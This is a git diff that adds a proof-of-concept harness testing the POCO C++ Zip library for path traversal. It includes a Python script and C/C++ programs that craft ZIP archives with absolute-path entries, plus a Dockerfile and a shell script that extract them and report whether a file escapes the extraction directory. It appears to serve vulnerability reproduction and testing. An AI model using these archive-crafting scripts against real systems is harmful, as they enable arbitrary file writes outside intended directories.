diff --git a/Dockerfile.vuln b/Dockerfile.vuln
new file mode 100644
index 00000000..8a55d49e
--- /dev/null
+++ b/Dockerfile.vuln
@@ -0,0 +1,20 @@
+FROM ubuntu:latest
+
+ENV DEBIAN_FRONTEND=noninteractive
+
+# Update package lists and install build dependencies
+RUN apt-get -y update && \
+    apt-get install -y build-essential g++ make cmake libssl-dev python3 && \
+    rm -rf /var/lib/apt/lists/*
+
+# Copy the project files into the container
+COPY . /project
+
+# Set the working directory inside the container
+WORKDIR /project
+
+# Make the test script executable
+RUN chmod +x /project/test_vulnerability.sh
+
+# Run the test
+CMD ["/project/test_vulnerability.sh"]
diff --git a/Zip/src/ZipCommon.cpp b/Zip/src/ZipCommon.cpp
index 60c6b29b..0265a132 100644
--- a/Zip/src/ZipCommon.cpp
+++ b/Zip/src/ZipCommon.cpp
@@ -13,7 +13,7 @@
 
 
 #include "Poco/Zip/ZipCommon.h"
-
+#include <cstdio>
 
 namespace Poco {
 namespace Zip {
@@ -21,6 +21,7 @@ namespace Zip {
 
 bool ZipCommon::isValidPath(const std::string& path)
 {
+	printf("[INSTRUMENTATION] isValidPath\n");
 	if (path == "..")
 		return false;
 	if (path.compare(0, 3, "../") == 0)
diff --git a/create_malicious_zip.py b/create_malicious_zip.py
new file mode 100644
index 00000000..ba0ea798
--- /dev/null
+++ b/create_malicious_zip.py
@@ -0,0 +1,42 @@
+#!/usr/bin/env python3
+
+import zipfile
+import sys
+import os
+import tempfile
+
+def create_malicious_zip(zip_path, target_path):
+    print(f"Creating malicious ZIP file with absolute path entry: {target_path}")
+    
+    # Create a temporary file with content
+    temp_fd, temp_path = tempfile.mkstemp()
+    try:
+        with os.fdopen(temp_fd, 'wb') as f:
+            f.write(b"This file was created by exploiting a path traversal vulnerability!")
+        
+        # Create the ZIP file with an absolute path entry
+        with zipfile.ZipFile(zip_path, 'w') as zipf:
+            # The key part: add the file with an absolute path in the ZIP archive
+            # This bypasses the relative path check but keeps the absolute path
+            zipf.write(temp_path, target_path)
+            
+            # Add a normal file too for comparison
+            zipf.writestr("normal.txt", b"This is a normal file in the ZIP archive")
+    finally:
+        # Clean up the temporary file
+        if os.path.exists(temp_path):
+            os.unlink(temp_path)
+    
+    print(f"Malicious ZIP file created at: {zip_path}")
+    # Print the contents of the ZIP file for debugging
+    with zipfile.ZipFile(zip_path, 'r') as zipf:
+        print("ZIP file contents:")
+        for info in zipf.infolist():
+            print(f" - {info.filename} (size: {info.file_size})")
+
+if __name__ == "__main__":
+    if len(sys.argv) != 3:
+        print(f"Usage: {sys.argv[0]} <output_zip_path> <target_absolute_path>")
+        sys.exit(1)
+    
+    create_malicious_zip(sys.argv[1], sys.argv[2])
diff --git a/test_vulnerability.c b/test_vulnerability.c
new file mode 100644
index 00000000..57fb8b7f
--- /dev/null
+++ b/test_vulnerability.c
@@ -0,0 +1,140 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+// Create a minimal ZIP file with an absolute path entry
+void create_malicious_zip(const char* zip_path, const char* target_path) {
+    FILE* zip = fopen(zip_path, "wb");
+    if (!zip) {
+        perror("Failed to create ZIP file");
+        exit(1);
+    }
+    
+    // Local file header signature
+    const unsigned char header[] = {
+        0x50, 0x4B, 0x03, 0x04,  // Local file header signature
+        0x14, 0x00,              // Version needed to extract
+        0x00, 0x00,              // General purpose bit flag
+        0x00, 0x00,              // Compression method (0 = stored)
+        0x00, 0x00,              // File last modification time
+        0x00, 0x00,              // File last modification date
+        0x00, 0x00, 0x00, 0x00,  // CRC-32
+        0x10, 0x00, 0x00, 0x00,  // Compressed size (16 bytes)
+        0x10, 0x00, 0x00, 0x00,  // Uncompressed size (16 bytes)
+    };
+    
+    fwrite(header, 1, sizeof(header), zip);
+    
+    // Filename length
+    unsigned short name_len = strlen(target_path);
+    fwrite(&name_len, 1, 2, zip);
+    
+    // Extra field length
+    unsigned short extra_len = 0;
+    fwrite(&extra_len, 1, 2, zip);
+    
+    // Filename
+    fwrite(target_path, 1, name_len, zip);
+    
+    // File data (16 bytes)
+    const char* data = "Vulnerability test";
+    fwrite(data, 1, 16, zip);
+    
+    // Central directory header
+    const unsigned char central_header[] = {
+        0x50, 0x4B, 0x01, 0x02,  // Central directory header signature
+        0x14, 0x00,              // Version made by
+        0x14, 0x00,              // Version needed to extract
+        0x00, 0x00,              // General purpose bit flag
+        0x00, 0x00,              // Compression method
+        0x00, 0x00,              // File last modification time
+        0x00, 0x00,              // File last modification date
+        0x00, 0x00, 0x00, 0x00,  // CRC-32
+        0x10, 0x00, 0x00, 0x00,  // Compressed size
+        0x10, 0x00, 0x00, 0x00,  // Uncompressed size
+    };
+    
+    fwrite(central_header, 1, sizeof(central_header), zip);
+    
+    // Filename length
+    fwrite(&name_len, 1, 2, zip);
+    
+    // Extra field length
+    fwrite(&extra_len, 1, 2, zip);
+    
+    // File comment length
+    unsigned short comment_len = 0;
+    fwrite(&comment_len, 1, 2, zip);
+    
+    // Disk number start
+    unsigned short disk_start = 0;
+    fwrite(&disk_start, 1, 2, zip);
+    
+    // Internal file attributes
+    unsigned short internal_attr = 0;
+    fwrite(&internal_attr, 1, 2, zip);
+    
+    // External file attributes
+    unsigned int external_attr = 0;
+    fwrite(&external_attr, 1, 4, zip);
+    
+    // Relative offset of local header
+    unsigned int offset = 0;
+    fwrite(&offset, 1, 4, zip);
+    
+    // Filename
+    fwrite(target_path, 1, name_len, zip);
+    
+    // End of central directory record
+    const unsigned char end_record[] = {
+        0x50, 0x4B, 0x05, 0x06,  // End of central directory signature
+        0x00, 0x00,              // Number of this disk
+        0x00, 0x00,              // Disk where central directory starts
+        0x01, 0x00,              // Number of central directory records on this disk
+        0x01, 0x00,              // Total number of central directory records
+        0x3D, 0x00, 0x00, 0x00,  // Size of central directory (61 bytes)
+        0x2E, 0x00, 0x00, 0x00,  // Offset of start of central directory (46 bytes)
+        0x00, 0x00               // Comment length
+    };
+    
+    fwrite(end_record, 1, sizeof(end_record), zip);
+    
+    fclose(zip);
+    printf("Created malicious ZIP file at %s with entry %s\n", zip_path, target_path);
+}
+
+int main() {
+    // Create test directories
+    system("mkdir -p /tmp/poco_test/extract");
+    
+    // Create a malicious ZIP file with an absolute path entry
+    const char* zip_path = "/tmp/poco_test/malicious.zip";
+    const char* target_path = "/tmp/poco_vulnerable_file.txt";
+    
+    create_malicious_zip(zip_path, target_path);
+    
+    // Remove the target file if it exists
+    unlink(target_path);
+    
+    // Build POCO and the unzip sample
+    system("cd /project && ./configure --no-tests && make -s -j$(nproc)");
+    system("cd /project/Zip/samples/unzip && make -s");
+    
+    // Extract the malicious ZIP file
+    printf("Extracting malicious ZIP file...\n");
+    char cmd[512];
+    snprintf(cmd, sizeof(cmd), "cd /project/Zip/samples/unzip && ./bin/Linux/x86_64/release/unzip -f %s /tmp/poco_test/extract", zip_path);
+    system(cmd);
+    
+    // Check if the vulnerability was exploited
+    if (access(target_path, F_OK) != -1) {
+        printf("VULNERABILITY DETECTED: File was created outside the extraction directory!\n");
+        system("cat /tmp/poco_vulnerable_file.txt");
+        unlink(target_path);
+        return 1;  // Exit with error code if vulnerability exists
+    } else {
+        printf("No vulnerability detected. The library correctly prevented path traversal.\n");
+        return 0;  // Exit with success code if no vulnerability
+    }
+}
diff --git a/test_vulnerability.cpp b/test_vulnerability.cpp
new file mode 100644
index 00000000..623c6c17
--- /dev/null
+++ b/test_vulnerability.cpp
@@ -0,0 +1,103 @@
+#include <iostream>
+#include <fstream>
+#include <string>
+#include "Poco/Zip/Decompress.h"
+#include "Poco/Zip/ZipArchive.h"
+#include "Poco/Path.h"
+#include "Poco/File.h"
+#include "Poco/Delegate.h"
+
+class DecompressHandler
+{
+public:
+    void onError(const void* pSender, std::pair<const Poco::Zip::ZipLocalFileHeader, const std::string>& info)
+    {
+        std::cerr << "Error: " << info.second << std::endl;
+    }
+
+    void onOK(const void* pSender, std::pair<const Poco::Zip::ZipLocalFileHeader, const Poco::Path>& info)
+    {
+        std::cout << "Extracted: " << info.second.toString() << std::endl;
+    }
+};
+
+int main(int argc, char** argv)
+{
+    try
+    {
+        // Create a test file
+        std::string testContent = "This is a test file for vulnerability testing";
+        std::string testFilePath = "/tmp/test_content.txt";
+        std::ofstream testFile(testFilePath);
+        testFile << testContent;
+        testFile.close();
+
+        // Create a malicious ZIP file with an absolute path entry
+        std::string zipPath = "/tmp/malicious.zip";
+        std::string cmd = "cd /tmp && echo '" + testContent + "' > test_content.txt && "
+                        "zip malicious.zip test_content.txt && "
+                        "printf '\\x50\\x4b\\x03\\x04\\x14\\x00\\x00\\x00\\x08\\x00' > header.bin && "
+                        "printf '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' >> header.bin && "
+                        "printf '\\x1c\\x00\\x00\\x00' >> header.bin && "
+                        "printf '/tmp/vulnerable_file.txt' >> header.bin && "
+                        "dd if=malicious.zip bs=1 skip=30 of=content.bin && "
+                        "cat header.bin content.bin > malicious_mod.zip && "
+                        "rm header.bin content.bin";
+
+        int result = system(cmd.c_str());
+        if (result != 0) {
+            std::cerr << "Failed to create malicious ZIP file" << std::endl;
+            return 1;
+        }
+
+        // Remove the target file if it exists
+        std::string vulnerableFilePath = "/tmp/vulnerable_file.txt";
+        Poco::File vulnerableFile(vulnerableFilePath);
+        if (vulnerableFile.exists()) {
+            vulnerableFile.remove();
+        }
+
+        // Create extraction directory
+        std::string extractDir = "/tmp/extract_dir";
+        Poco::File extractDirFile(extractDir);
+        if (extractDirFile.exists()) {
+            extractDirFile.remove(true);
+        }
+        extractDirFile.createDirectories();
+
+        // Extract the malicious ZIP file
+        std::cout << "Extracting malicious ZIP file..." << std::endl;
+        std::ifstream zipFile("/tmp/malicious_mod.zip", std::ios::binary);
+        Poco::Path extractPath(extractDir);
+        DecompressHandler handler;
+        Poco::Zip::Decompress decompress(zipFile, extractPath);
+        decompress.EError += Poco::delegate(&handler, &DecompressHandler::onError);
+        decompress.EOk += Poco::delegate(&handler, &DecompressHandler::onOK);
+        decompress.decompressAllFiles();
+        zipFile.close();
+
+        // Check if the vulnerability was exploited
+        if (vulnerableFile.exists()) {
+            std::cout << "VULNERABILITY DETECTED: File was created outside the extraction directory!" << std::endl;
+            std::ifstream vulnFile(vulnerableFilePath);
+            std::string content((std::istreambuf_iterator<char>(vulnFile)), std::istreambuf_iterator<char>());
+            std::cout << "Content: " << content << std::endl;
+            vulnFile.close();
+            vulnerableFile.remove();
+            return 1;  // Exit with error code if vulnerability exists
+        } else {
+            std::cout << "No vulnerability detected. The library correctly prevented path traversal." << std::endl;
+            return 0;  // Exit with success code if no vulnerability
+        }
+    }
+    catch (Poco::Exception& ex)
+    {
+        std::cerr << "POCO Exception: " << ex.displayText() << std::endl;
+        return 2;
+    }
+    catch (std::exception& ex)
+    {
+        std::cerr << "STD Exception: " << ex.what() << std::endl;
+        return 3;
+    }
+}
diff --git a/test_vulnerability.sh b/test_vulnerability.sh
new file mode 100644
index 00000000..9b0293c2
--- /dev/null
+++ b/test_vulnerability.sh
@@ -0,0 +1,54 @@
+#!/bin/bash
+
+set -e
+
+# Create test directories
+mkdir -p /tmp/poco_test/extract
+
+# Define paths
+ZIP_PATH="/tmp/poco_test/malicious.zip"
+TARGET_PATH="/tmp/poco_vulnerable_file.txt"
+EXTRACT_DIR="/tmp/poco_test/extract"
+
+# Remove target file if it exists
+rm -f "$TARGET_PATH"
+
+# Create a malicious ZIP file with an absolute path entry
+python3 /project/create_malicious_zip.py "$ZIP_PATH" "$TARGET_PATH"
+
+# Build POCO and the unzip sample
+cd /project && ./configure --no-tests && make -s -j$(nproc)
+
+# Debug: Check if the Zip directory exists
+echo "Checking Zip directory:"
+ls -la /project/Zip
+
+# Debug: Check if the samples directory exists
+echo "Checking samples directory:"
+ls -la /project/Zip/samples
+
+# Debug: Check if the unzip directory exists
+echo "Checking unzip directory:"
+ls -la /project/Zip/samples/unzip
+
+# Build the unzip sample
+cd /project/Zip/samples/unzip && make -s
+
+# Debug: Check if the unzip binary was built
+echo "Checking for unzip binary:"
+find /project/Zip/samples/unzip -name "unzip" -type f
+
+# Extract the malicious ZIP file
+echo "Extracting malicious ZIP file..."
+cd /project/Zip/samples/unzip && ./bin/Linux/x86_64/release/unzip -f "$ZIP_PATH" "$EXTRACT_DIR" || echo "Extraction failed with code $?"
+
+# Check if the vulnerability was exploited
+if [ -f "$TARGET_PATH" ]; then
+    echo "VULNERABILITY DETECTED: File was created outside the extraction directory!"
+    cat "$TARGET_PATH"
+    rm -f "$TARGET_PATH"
+    exit 1  # Exit with error code if vulnerability exists
+else
+    echo "No vulnerability detected. The library correctly prevented path traversal."
+    exit 0  # Exit with success code if no vulnerability
+fi
